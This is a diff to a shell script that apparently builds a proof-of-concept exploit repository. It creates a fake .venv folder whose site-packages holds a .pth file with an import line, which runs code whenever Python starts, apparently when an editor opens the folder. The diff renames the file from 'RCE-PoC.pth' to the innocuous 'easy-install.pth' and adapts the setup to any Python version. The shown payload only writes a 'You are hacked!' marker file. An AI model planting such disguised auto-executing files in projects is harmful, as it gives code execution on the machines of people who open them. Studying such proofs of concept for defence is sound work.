@@ -1,4 +1,9 @@
-mkdir -p .venv/bin .venv/lib/python3.14/site-packages
+PYTHON=$(command -v python3) || { echo "python3 not found"; exit 1; }
+PYVER=$("$PYTHON" -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')")
+PYFULL=$("$PYTHON" --version 2>&1 | cut -d' ' -f2)
+PYDIR=".venv/lib/python$PYVER"
+
+mkdir -p .venv/bin "$PYDIR"
 
 cat > .gitignore << 'EOF'
 __pycache__/
@@ -21,16 +26,16 @@ if __name__ == "__main__":
     main()
 EOF
 
-cat > .venv/pyvenv.cfg << 'EOF'
+cat > .venv/pyvenv.cfg << EOF
 home = /usr/bin
 include-system-site-packages = false
-version = 3.14.4
-executable = /usr/bin/python3
-command = /usr/bin/python3 -m venv .venv
+version = $PYFULL
+executable = $PYTHON
+command = $PYTHON -m venv .venv
 EOF
 
-ln -sf /usr/bin/python3 .venv/bin/python3
+ln -sf "$PYTHON" .venv/bin/python3
 
-cat > .venv/lib/python3.14/site-packages/RCE-PoC.pth << 'EOF'
-import os; open("/tmp/pwned","w").write("pwned")
+cat > "$PYDIR/easy-install.pth" << 'EOF'
+import os; open("/home/cran/PoC/VSCode/src/hacked","w").write("You are hacked!")
 EOF
